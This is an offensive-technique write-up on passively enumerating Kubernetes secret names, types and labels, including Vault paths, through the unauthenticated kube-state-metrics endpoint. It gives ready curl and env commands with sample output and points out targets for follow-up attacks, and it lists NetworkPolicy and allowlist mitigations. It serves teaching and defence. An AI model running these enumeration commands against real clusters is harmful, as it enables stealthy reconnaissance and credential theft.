---
title: Passive Secret Discovery via kube-state-metrics
description: Passively discovering secret names, namespaces, and metadata cluster-wide by querying the unauthenticated kube-state-metrics endpoint
category: offensive
createdAt: 2026-04-11
impact: Exposes every secret name, namespace, and type across the cluster by default. When label exposure is enabled, leaks Vault paths, sensitivity classification, owning team, and rotation policy for each secret
mitigation:
  - Restrict network access to the kube-state-metrics Service using a **NetworkPolicy** that allows ingress only from the Prometheus server pod, not from arbitrary pods in the cluster
  - Avoid using wildcard values in **metricLabelsAllowlist** for sensitive resource types. Scope it to specific label keys on non-sensitive resources rather than applying it broadly across all secrets
  - Treat the kube-state-metrics endpoint as sensitive infrastructure. It should not be reachable from workload namespaces without explicit policy
  - Audit existing **metricLabelsAllowlist** configuration and remove secret label exposure if it is not required for active dashboards or alerting rules
mitreTechniques:
  - T1046
  - T1613
references: |
  - [kube-state-metrics Secret Metrics](https://github.com/kubernetes/kube-state-metrics/blob/main/docs/metrics/storage/secret-metrics.md)
  - [kube-state-metrics CLI Arguments](https://github.com/kubernetes/kube-state-metrics/blob/main/docs/developer/cli-arguments.md)
---

kube-state-metrics is a service that converts Kubernetes object state into Prometheus metric series. It runs in the majority of production clusters as part of the standard Prometheus stack and exposes an HTTP metrics endpoint on port `8080` with no authentication required by default. Any pod that can reach this endpoint can query the full state of every monitored Kubernetes resource.

This technique exploits the fact that kube-state-metrics exposes secret metadata as queryable metrics. An attacker inside the cluster can enumerate every secret name, namespace, and type across all namespaces without ever calling the Kubernetes API server, generating no audit events in the process.

## The attack sequence

The attacker discovers the `kube-state-metrics` endpoint and queries it to enumerate secrets without touching the Kubernetes API. Impact depends on how kube-state-metrics is configured.

| Configuration | What is exposed | Notes |
| --- | --- | --- |
| **Default** (no secret label allowlist) | Every secret’s **name**, **namespace**, and **type** cluster-wide | Works out of the box with no API calls. Typical **audit logs** on the API server do not reflect this enumeration. |
| **`metricLabelsAllowlist` includes secrets** (e.g. `secrets=[*]`) | Default data **plus** **all labels** on each secret as metric dimensions | Often added for dashboards (cost, team, compliance). Also leaks paths like Vault references, sensitivity, rotation policy, and ownership if those exist as labels. |

## Discovering the kube-state-metrics Endpoint

From inside a compromised pod, the kube-state-metrics Service is reachable via its cluster DNS name. The service is typically deployed in the same namespace as Prometheus and is discoverable via environment variable injection.

> [!NOTE]
> kube-state-metrics is usually installed with Prometheus. The metrics port is **`8080`** by default and the namespace is typically **`monitoring`** or **`observability`**.

### Typical service DNS names

Replace `<release>` with your Helm release name and `<namespace>` with the install namespace.

| Helm chart | Typical cluster DNS name |
| --- | --- |
| [prometheus-community/prometheus](https://github.com/prometheus-community/helm-charts/tree/main/charts/prometheus) | `<release>-kube-state-metrics.<namespace>.svc.cluster.local` |
| [kube-prometheus-stack](https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-prometheus-stack) | `<release>-kube-state-metrics.<namespace>.svc.cluster.local` |
| [kube-state-metrics](https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-state-metrics) (standalone) | `<release>-kube-state-metrics.<namespace>.svc.cluster.local` |

```bash
env | grep KUBE_STATE
```

```output
PROMETHEUS_KUBE_STATE_METRICS_SERVICE_HOST=10.102.239.220
PROMETHEUS_KUBE_STATE_METRICS_SERVICE_PORT=8080
PROMETHEUS_KUBE_STATE_METRICS_PORT=tcp://10.102.239.220:8080
PROMETHEUS_KUBE_STATE_METRICS_PORT_8080_TCP=tcp://10.102.239.220:8080
PROMETHEUS_KUBE_STATE_METRICS_PORT_8080_TCP_ADDR=10.102.239.220
PROMETHEUS_KUBE_STATE_METRICS_PORT_8080_TCP_PORT=8080
PROMETHEUS_KUBE_STATE_METRICS_PORT_8080_TCP_PROTO=tcp
```

## Enumerating All Secrets

> [!TIP]
> Applies to: **Default**

The `kube_secret_info` metric exposes every secret name and namespace across the cluster:

```bash
curl -s http://prometheus-kube-state-metrics.monitoring.svc.cluster.local:8080/metrics \
  | grep "^kube_secret_info"
```

```output
kube_secret_info{namespace="argocd",secret="argocd-redis"} 1
kube_secret_info{namespace="argocd",secret="argocd-notifications-secret"} 1
kube_secret_info{namespace="argocd",secret="argocd-secret"} 1
kube_secret_info{namespace="argocd",secret="argocd-initial-admin-secret"} 1
kube_secret_info{namespace="istio-system",secret="istio-ca-secret"} 1
kube_secret_info{namespace="production-app",secret="db-credentials"} 1
kube_secret_info{namespace="production-app",secret="api-keys"} 1
kube_secret_info{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v1"} 1
kube_secret_info{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v2"} 1
```

The `kube_secret_type` metric adds the secret type to each entry, revealing which secrets hold TLS certificates, which are generic secrets, and which are Helm release state:

```bash
curl -s http://prometheus-kube-state-metrics.monitoring.svc.cluster.local:8080/metrics \
  | grep "^kube_secret_type"
```

```output
kube_secret_type{namespace="argocd",secret="argocd-redis",type="Opaque"} 1
kube_secret_type{namespace="argocd",secret="argocd-notifications-secret",type="Opaque"} 1
kube_secret_type{namespace="argocd",secret="argocd-secret",type="Opaque"} 1
kube_secret_type{namespace="argocd",secret="argocd-initial-admin-secret",type="Opaque"} 1
kube_secret_type{namespace="istio-system",secret="istio-ca-secret",type="istio.io/ca-root"} 1
kube_secret_type{namespace="production-app",secret="db-credentials",type="Opaque"} 1
kube_secret_type{namespace="production-app",secret="api-keys",type="Opaque"} 1
kube_secret_type{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v1",type="helm.sh/release.v1"} 1
kube_secret_type{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v2",type="helm.sh/release.v1"} 1
kube_secret_type{namespace="kyverno",secret="kyverno-svc.kyverno.svc.kyverno-tls-ca",type="kubernetes.io/tls"} 1
kube_secret_type{namespace="kyverno",secret="kyverno-cleanup-controller.kyverno.svc.kyverno-tls-pair",type="kubernetes.io/tls"} 1
```

From these two queries alone, an attacker can identify high-value targets. `argocd-initial-admin-secret` signals the presence of the ArgoCD initial admin credential, which is a high-value target for UI access. `istio-ca-secret` identifies the Istio root CA material, which is a target for certificate forgery attacks. `db-credentials` and `api-keys` in a `production-app` namespace are self-describing targets for follow-up exploitation.

## Harvesting Secret Labels

> [!TIP]
> Applies to: **metricLabelsAllowlist enabled**

When `metricLabelsAllowlist` is configured to include secrets, the `kube_secret_labels` metric exposes all labels attached to each secret as additional dimensions:

```bash
curl -s http://prometheus-kube-state-metrics.monitoring.svc.cluster.local:8080/metrics \
  | grep "^kube_secret_labels"
```

```output
kube_secret_labels{namespace="production-app",secret="api-keys",label_environment="production",label_sensitivity="critical",label_service="stripe",label_team="payments",label_vault_path="prod.api-keys"} 1
kube_secret_labels{namespace="production-app",secret="db-credentials",label_environment="production",label_managed_by="vault-agent",label_rotation_policy="30d",label_sensitivity="high",label_team="backend",label_vault_path="prod.database"} 1
kube_secret_labels{namespace="argocd",secret="argocd-notifications-secret",label_app_kubernetes_io_component="notifications-controller",label_app_kubernetes_io_name="argocd-notifications-controller",label_app_kubernetes_io_part_of="argocd"} 1
kube_secret_labels{namespace="argocd",secret="argocd-secret",label_app_kubernetes_io_name="argocd-secret",label_app_kubernetes_io_part_of="argocd"} 1
kube_secret_labels{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v1",label_name="prometheus",label_owner="helm",label_status="superseded",label_version="1"} 1
kube_secret_labels{namespace="monitoring",secret="sh.helm.release.v1.prometheus.v2",label_name="prometheus",label_owner="helm",label_status="deployed",label_version="2"} 1
```

The `api-keys` secret reveals `label_service=stripe` and `label_vault_path=prod.api-keys`. Combined with knowledge of the Vault auth path, an attacker can attempt to request those credentials from the Vault API using the pod's mounted service account token if the service account is bound to that Vault role.

